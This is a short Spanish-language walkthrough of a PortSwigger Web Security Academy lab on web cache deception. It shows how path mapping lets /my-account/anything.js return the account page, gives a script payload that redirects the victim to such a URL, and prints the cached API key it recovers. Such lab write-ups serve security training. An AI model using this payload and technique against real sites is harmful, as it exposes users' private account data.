#Lab: Exploiting path mapping for web cache deception
```
 To solve the lab, find the API key for the user carlos.
You can log in to your own account using the following credentials: wiener:peter. 
```

pasos:
```
Despues de autenticarme, accedí a a la vista de mi cuenta -->https://xxx.web-security-academy.net/my-account

En la respuesta se mostraba mi API key.
Probé varias para ver que me devolvia como: https://xxx.web-security-academy.net/my-account/hola.js
Siempre me devolvia lo mismo --> El backend interpreta /my-account/hola.js como /my-account


Utilicé el servidor de exploits del laboratorio para forzar a  a visitar una URL maliciosa:

<script>
document.location="https://LAB-ID.web-security-academy.net/my-account/exploit123.js"
</script>

Al hacer clic en "Deliver exploit to victim", el usuario víctima accede a: /my-account/exploit123.js


Después de que la persona acceda a la URL, simplemente visité: xxx/my-account/exploit123.js


Your username is: carlos
Your API Key is: RDHrkm0GMS2rV9BY4gGp75jPaT7GRJu6
```
